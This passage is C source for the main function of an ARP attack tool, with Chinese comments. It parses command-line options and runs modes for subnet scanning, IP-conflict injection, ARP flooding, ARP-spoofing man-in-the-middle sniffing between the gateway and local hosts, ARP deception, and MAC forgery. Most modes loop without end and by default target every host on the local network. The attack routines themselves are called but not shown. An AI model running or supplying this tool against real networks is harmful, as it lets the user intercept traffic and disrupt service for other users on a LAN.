arpattack -t vm -i interface [-m …] [-l …]\n" };

	hoststart.s_addr=0;
	hostend.s_addr=0;
	ehoststart.s_addr=0;
	ehostend.s_addr=0;	
	ohoststart.s_addr=0;	
	ohostend.s_addr=0;
	ahoststart.s_addr=0;
	ahostend.s_addr=0;	
	sniffer.s_addr=0;
	vmhead=	NULL;

	isbigendian();/*检验系统是bigendian还是littleendian*/
	while((c=getopt_long(argc,argv,":h:t:s:e:i:n:o:a:m:l:",longopts,NULL))!=-1)
	{
		switch(c)
		{
			case 'h':
				hoststart.s_addr=0;
				hostend.s_addr=0;
				hosts_number=0;
				if(parse_hosts(optarg,&hoststart.s_addr,&hostend.s_addr,hosts,&hosts_number)<0)
					err_quit("the specified host address is wrong!");
				options|=OPT_HOSTS;
				break;
			case 't':
				if(type)
					err_quit("you can specify only one arpattack type!");
				type=parsetype(optarg);
				if(type<0)
					err_quit("the arpattack type you specified doesn't exit!");
				break;
			case 's':
				sniffer.s_addr=0;
				if(!inet_aton(optarg,&sniffer))
					err_quit("the sniffer you specified is illegal!");
				options|=OPT_SNIFFER;
				break;
			case 'e':
				ehoststart.s_addr=0;
				ehostend.s_addr=0;
				ehosts_number=0;
				if(parse_hosts(optarg,&ehoststart.s_addr,&ehostend.s_addr,ehosts,&ehosts_number)<0)
					err_quit("the specified exclusive host address is wrong!");
				options|=OPT_EXCLUSIVE;
				break;
			case 'i':
				strcpy(ifi_name,optarg);
				options|=OPT_INTERFACE;
				break;
			case 'n':
				number=atoi(optarg);
				if(number<0)
					err_quit("the number you specifie is wrong!");
				options|=OPT_NUMBER;
				break;
			case 'o':
				ohoststart.s_addr=0;
				ohostend.s_addr=0;
				ohosts_number=0;
				if(parse_hosts(optarg,&ohoststart.s_addr,&ohostend.s_addr,ohosts,&ohosts_number)<0)
					err_quit("the specified one_end host address is wrong!");
				options|=OPT_ONE_END;				
				break;
			case 'a':
				ahoststart.s_addr=0;
				ahostend.s_addr=0;
				ahosts_number=0;
				if(parse_hosts(optarg,&ahoststart.s_addr,&ahostend.s_addr,ahosts,&ahosts_number)<0)
					err_quit("the specified one_end host address is wrong!");
				options|=OPT_ANOTHER_END;				
				break;
			case 'm':
				vmhead=parse_match(optarg);
#ifdef MATCHDEBUG
{
				struct vm *temp=vmhead;
				char str[100];

				while(temp){
					fprintf(stdout,"(hoststart=%s,",inet_ntoa(*((struct in_addr *)(&temp->hoststart))));					
					fprintf(stdout,"hostend=%s,",inet_ntoa(*((struct in_addr *)(&temp->hostend))));
					printMAC(str,temp->haddr,6);
					fprintf(stdout,"mac=%s)\n",str);
					temp=temp->next;
				}
}
#endif
				options|=OPT_MATCH;								
				break;
			case 'l':
				timeslot=atoi(optarg);
				if(timeslot<0)
					err_quit("you must specify a positive timeslot!");
				options|=OPT_TIMESLOT;								
				break;
			case ':':
				/*缺少选项参数*/
				fprintf(stderr,"%s:option '-%c' requires an argument\n",argv[0],optopt);
				exit(1);
			case '?':
			default:
				/*无效选项*/
				fprintf(stderr,"%s:option '-%c' is invalid\n",argv[0],optopt);
				exit(1);
		}
	}
	if(argc==1){
		fprintf(stdout,"%s",helpinfo);
		exit(0);
	}	
	if(!type)
		err_quit("you must specify an arpattack type!");
	generic_opt_check(type,options);
	localaddr=get_interface_info(ifi_name, haddr, &hlen,&netmask,&ifindex);
	if(!localaddr.s_addr)
		err_quit("can't get the local ip addr on the interface %s!",ifi_name);
	if(hosts_number)
		qsort(hosts,hosts_number,sizeof(u_int32_t),compar);
	if(ehosts_number)
		qsort(ehosts,ehosts_number,sizeof(u_int32_t),compar);
	if(ohosts_number)
		qsort(ohosts,ohosts_number,sizeof(u_int32_t),compar);
	if(ahosts_number)
		qsort(ahosts,ahosts_number,sizeof(u_int32_t),compar);
#ifdef DEBUG
	int i;
	if(hosts_number)
		for(i=0;i<hosts_number;i++)
			printf("%s\n",inet_ntoa(*((struct in_addr *)(hosts+i))));
#endif
	if(type&(TYPE_SCAN|TYPE_IPCONFLICT|TYPE_ARPFLOOD|TYPE_RECOVER|TYPE_VM))
		if(!hoststart.s_addr&&!hosts_number)/*若命令中的-h选项未指定那么默认的攻击目标
													是interface网络接口所对应网络中的主机*/
			cmpipaddr2(localaddr.s_addr,netmask.s_addr,&hoststart.s_addr,&hostend.s_addr);
	if(type&(TYPE_IPCONFLICT|TYPE_ARPFLOOD|TYPE_SNIFFER|TYPE_ARPDECEIVE|TYPE_VM|TYPE_RECOVER))
		if(!timeslot)
			timeslot=3;
	if(!(type&TYPE_SCAN)){
		u_int32_t hoststart,hostend;
		
		fprintf(stdout,"正在初始化ip-mac映射表......\n");
		fflush(stdout);
		cmpipaddr2(localaddr.s_addr,netmask.s_addr,&hoststart,&hostend);
		hostscan(hoststart,hostend,NULL,0,0,0,NULL,0,hlen,haddr,localaddr.s_addr,ifindex);		
		fprintf(stdout,"初始化完毕，开始攻击\n");
		fflush(stdout);		
//		printipmac(hlen);		
	}
	switch(type){
		case TYPE_SCAN:
#ifdef DEBUG
			fprintf(stdout,"localaddr=%s,",inet_ntoa(localaddr));
			fprintf(stdout,"netmask=%s\n",inet_ntoa(netmask));
			fprintf(stdout,"(%s,",inet_ntoa(hoststart));
			fprintf(stdout,"%s)\n",inet_ntoa(hostend));
#endif
			hostscan(hoststart.s_addr,hostend.s_addr,hosts,hosts_number,ehoststart.s_addr,ehostend.s_addr,
						ehosts,ehosts_number,hlen,haddr,localaddr.s_addr,ifindex);
			printipmac(hlen);
			break;
		case TYPE_IPCONFLICT:
			while(1){
				ipconflict(hoststart.s_addr,hostend.s_addr,hosts,hosts_number,ehoststart.s_addr,ehostend.s_addr,
						ehosts,ehosts_number,hlen,ifindex);
				sleep(timeslot);
			}
			break;	
		case TYPE_ARPFLOOD:
			if(!number)
				number=3000;
#ifdef DEBUG
			fprintf(stdout,"(%s,",inet_ntoa(hoststart));
			fprintf(stdout,"%s)\n",inet_ntoa(hostend));
#endif			
			while(1){
				arpflood(hoststart.s_addr,hostend.s_addr,hosts,hosts_number,ehoststart.s_addr,ehostend.s_addr,
						ehosts,ehosts_number,hlen,ifindex,number);
				sleep(timeslot);
			}			
			break;
		case TYPE_SNIFFER:
			if(!ohoststart.s_addr&&!ohosts_number){/*若命令中的-o选项未指定那么默认的监听目标
													之一是interface网络接口所对应网关*/
				if(getgateway((struct sockaddr *)&gateway,ifi_name)<0)
					err_quit("there is no default gateway in the routing table!");
				ohoststart.s_addr=ohostend.s_addr=gateway.sin_addr.s_addr;				
			}
			if(!ahoststart.s_addr&&!ahosts_number)/*若命令中的-a选项未指定那么默认的攻击目标
													另一个目标是interface网络接口所对应网络中的主机*/
				cmpipaddr2(localaddr.s_addr,netmask.s_addr,&ahoststart.s_addr,&ahostend.s_addr);																	
			if(!sniffer.s_addr)/*若命令中的-s选项未指定那么默认的监听主机是本地主机*/
				sniffer.s_addr=localaddr.s_addr;
			while(1){
				Sniffer(ohoststart.s_addr,ohostend.s_addr,ohosts,ohosts_number,
						ahoststart.s_addr,ahostend.s_addr,ahosts,ahosts_number,
						ehoststart.s_addr,ehostend.s_addr,ehosts,ehosts_number,
						hlen,ifindex,sniffer.s_addr,1);
				sleep(timeslot);
			}				
			break;
		case TYPE_ARPDECEIVE:
			while(1){
				Sniffer(ohoststart.s_addr,ohostend.s_addr,ohosts,ohosts_number,
						ahoststart.s_addr,ahostend.s_addr,ahosts,ahosts_number,
						ehoststart.s_addr,ehostend.s_addr,ehosts,ehosts_number,
						hlen,ifindex,sniffer.s_addr,0);
				sleep(timeslot);
			}			
			break;	
		case TYPE_RECOVER:
			while(1){
				recover(hoststart.s_addr, hostend.s_addr, hosts, hosts_number, 
				        ehoststart.s_addr, ehostend.s_addr, ehosts, ehosts_number, 
				        hlen, ifi_name);
				sleep(timeslot);
			}
			break;	
		case TYPE_VM:
			if(vmhead){
				char haddr2[IFI_HADDR];
				struct vm *temp=vmhead;

				memset(haddr2,0,IFI_HADDR);
				while(temp){
					swap(&temp->hoststart);/*为了方便后面比较大小*/
					swap(&temp->hostend);					
					if(!memcmp(temp->haddr,haddr2,IFI_HADDR))/*若命令中未指定mac地址,那么用本地主机对应的mac地址*/
						memcpy(temp->haddr,haddr,IFI_HADDR);
					temp=temp->next;
				}
			}
			else{/*若未指定-m选项,则默认虚拟伪造-i对应网络接口所在局域网内的
			            所有正在运行的主机，其伪造的mac地址为本地主机mac地址*/
				vmhead=(struct vm *)Malloc(sizeof(struct vm));
				vmhead->hoststart=hoststart.s_addr;
				vmhead->hostend=hostend.s_addr;
				swap(&vmhead->hoststart);
				swap(&vmhead->hostend);
				memcpy(vmhead->haddr,haddr,IFI_HADDR);
				vmhead->next=NULL;
			}
#ifdef MATCHDEBUG
{
			struct vm *temp=vmhead;
			char str[100];

			while(temp){
				fprintf(stdout,"(hoststart=%s,",inet_ntoa(*((struct in_addr *)(&temp->hoststart))));					
				fprintf(stdout,"hostend=%s,",inet_ntoa(*((struct in_addr *)(&temp->hostend))));
				printMAC(str,temp->haddr,6);
				fprintf(stdout,"mac=%s)\n",str);
				temp=temp->next;
			}
}
#endif
			vmparam.ifindex=ifindex;
			vmparam.vmhead=vmhead;
			if(pthread_create(&vmtid,NULL,vm_response,&vmparam))
				err_quit("pthread_create error!");
			while(1)
				sleep(3600);				
			break;				
	}
	return(0);
}

